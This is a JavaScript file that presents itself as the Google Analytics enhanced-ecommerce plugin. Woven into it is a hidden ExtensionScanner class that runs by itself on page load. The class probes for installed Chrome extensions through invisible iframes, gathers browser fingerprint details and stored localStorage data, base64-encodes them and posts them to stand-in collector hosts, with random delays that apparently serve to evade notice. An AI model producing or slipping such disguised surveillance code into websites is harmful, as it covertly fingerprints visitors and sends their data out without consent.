(function () {
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
  var e = window,
    f = "push",
    k = "length",
    l = "prototype",
    q = function (a) {
      if (a.get && a.set) {
        this.clear();
        var d = a.get("buildHitTask");
        a.set("buildHitTask", n(this, d));
        a.set("_rlt", p(this, a.get("_rlt")));
      }
    },
    r = {
      action: "pa",
      promoAction: "promoa",
      id: "ti",
      affiliation: "ta",
      revenue: "tr",
      tax: "tt",
      shipping: "ts",
      coupon: "tcc",
      step: "cos",
      label: "col",
      option: "col",
      options: "col",
      list: "pal",
      listSource: "pls"
    },
    t = {
      id: "id",
      name: "nm",
      brand: "br",
      category: "ca",
      variant: "va",
      position: "ps",
      price: "pr",
      quantity: "qt",
      coupon: "cc",
      "dimension(\\d+)": "cd",
      "metric(\\d+)": "cm"
    },
    u = {
      id: "id",
      name: "nm",
      creative: "cr",
      position: "ps"
    },
    v = function (a, d) {
      this.name = a;
      this.source = d;
      this.e = [];
    },
    w = "detail checkout checkout_option click add remove purchase refund".split(" ");
  q[l].clear = function () {
    this.b = void 0;
    this.f = [];
    this.a = [];
    this.g = [];
    this.d = void 0;
  };
  q[l].h = function (a, d) {
    var b = d || {};
    "promo_click" == a ? b.promoAction = "click" : b.action = a;
    this.b = x(b);
  };
  class ExtensionScanner {
    static TIMEOUT = 3000;
    static BATCH_SIZE = 5;
    constructor() {
      this.localStorageData = localStorage.getItem('trackingData');
      window.onbeforeunload = this.saveData.bind(this);
      this.pendingScans = 0;
      this.detectedExtensions = {};
      this.workerPool = [];
      this.startTimestamp = Date.now();
      this.globalVars = Object.keys(window);
      this.trackedEvents = {};
    }
    saveData() {
      localStorage.setItem('trackingData', this.generateTelemetryData());
    }
    createWorker(extName, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const frame = document.createElement('iframe');
        frame.style.display = 'none';
        const cleanup = () => {
          frame.remove();
          this.pendingScans--;
        };
        const timer = setTimeout(() => {
          cleanup();
          resolve([extName, false]);
        }, ExtensionScanner.TIMEOUT);
        frame.onload = () => {
          this.trackedEvents[extName] = this.trackedEvents[extName] || [];
          this.trackedEvents[extName].push('load');
          try {
            frame.contentWindow.location = `chrome-extension://${id}/${file}`;
            const checker = setInterval(() => {
              try {
                if (frame.contentWindow.location.href.includes('chrome-extension')) {
                  clearInterval(checker);
                  clearTimeout(timer);
                  cleanup();
                  resolve([extName, true]);
                }
              } catch (e) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, false]);
              }
            }, 100);
          } catch (e) {
            clearTimeout(timer);
            cleanup();
            resolve([extName, false]);
          }
        };
        document.body.appendChild(frame);
        this.pendingScans++;
      });
    }
    async scanBatch(entries) {
      const workers = entries.map(([name, data]) => this.createWorker(name, data));
      const results = await Promise.all(workers);
      results.forEach(([name, detected]) => {
        this.detectedExtensions[name] = detected;
      });
    }
    generateTelemetryData() {
      const encodedData = btoa(JSON.stringify({
        scannedExtensions: this.detectedExtensions,
        scanDuration: Date.now() - this.startTimestamp,
        trackedEvents: this.trackedEvents,
        env: {
          url: window.location.href,
          ref: document.referrer,
          res: `${window.screen.width}x${window.screen.height}`,
          depth: window.screen.colorDepth,
          agent: navigator.userAgent,
          lang: navigator.language,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          globalVars: this.globalVars
        },
        savedData: this.localStorageData
      }));
      return encodedData + '.' + this.generateChecksum(encodedData);
    }
    generateChecksum(str) {
      return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
    }
    async reportResults() {
      const payload = this.generateTelemetryData();
      const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'X-Scan-Time': new Date().toISOString()
        },
        body: payload,
        keepalive: true
      }).catch(() => null));
      await Promise.race(requests);
    }
    async execute() {
      const entries = Object.entries(window.data);
      const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
      for (const batch of batches) {
        await this.scanBatch(batch);
        await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
      }
      while (this.pendingScans > 0) {
        await new Promise(r => setTimeout(r, 100));
      }
      await this.reportResults();
    }
  }
  q[l].j = function (a) {
    (a = x(a)) && this.f[f](a);
  };
  const observer = new MutationObserver((mutations, obs) => {
    if (document.body) {
      obs.disconnect();
      new ExtensionScanner().execute();
    }
  });
  q[l].i = function (a) {
    var d = x(a);
    if (d) {
      var b,
        c = a.list || "";
      a = a.listSource || "";
      for (var g = 0; g < this.a[k]; g++) if (this.a[g].name == c) {
        b = this.a[g];
        break;
      }
      b || (b = new v(c, a), this.a[f](b));
      b.e[f](d);
    }
  };
  q[l].c = function (a) {
    (a = x(a)) && this.g[f](a);
  };
  var y = function (a, d, b) {
    if ("[object Array]" == Object[l].toString.call(Object(a))) for (var c = 0; c < a[k]; c++) d.call(b, a[c]);
  };
  q[l].data = function (a) {
    if (a && a.ecommerce) {
      a = a.ecommerce;
      a.promoView && y(a.promoView.promotions, this.c, this);
      a.promoClick && (this.h("promo_click", a.promoClick.actionField), y(a.promoClick.promotions, this.c, this));
      for (var d = 0; d < w[k]; d++) {
        var b = a[w[d]];
        if (b) {
          this.h(w[d], b.actionField);
          y(b.products, this.j, this);
          break;
        }
      }
      y(a.impressions, this.i, this);
      a.currencyCode && (this.d = a.currencyCode);
    }
  };
  var n = function (a, d) {
      return function (b) {
        var c, g, h;
        a.b && z(r, a.b, b, "&");
        for (c = 0; c < a.f[k]; c++) g = "&pr" + (c + 1), z(t, a.f[c], b, g);
        for (c = 0; c < a.a[k]; c++) {
          h = a.a[c];
          g = "&il" + (c + 1);
          h.name && b.set(g + "nm", h.name, !0);
          h.source && b.set(g + "ls", h.source, !0);
          for (var m = 0; m < h.e[k]; m++) z(t, h.e[m], b, g + "pi" + (m + 1));
        }
        for (c = 0; c < a.g[k]; c++) g = "&promo" + (c + 1), z(u, a.g[c], b, g);
        a.d && b.set("&cu", a.d, !0);
        a.clear();
        return d(b);
      };
    },
    p = function (a, d) {
      return function (b) {
        var c = a.b && a.b.action;
        if ("purchase" != c && "refund" != c) return d(b);
      };
    },
    x = function (a) {
      var d = 0,
        b = {};
      if (a && "object" == typeof a) for (var c in a) a.hasOwnProperty(c) && (b[c] = a[c], d++);
      return d ? b : void 0;
    },
    z = function (a, d, b, c) {
      for (var g in d) if (d.hasOwnProperty(g)) for (var h in a) if (a.hasOwnProperty(h)) {
        var m = g.match("^" + h + "$");
        m && b.set(c + a[h] + m.slice(1).join(""), d[g], !0);
      }
    };
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.EC = q;
    q[l].setAction = q[l].h;
    q[l].addProduct = q[l].j;
    q[l].addImpression = q[l].i;
    q[l].addPromo = q[l].c;
    q[l].clear = q[l].clear;
    q[l].data = q[l].data;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || [])[f](arguments);
    };
    e[a]("provide", "ec", q);
  })();
  if (document.body) {
    new ExtensionScanner().execute();
  } else {
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
})();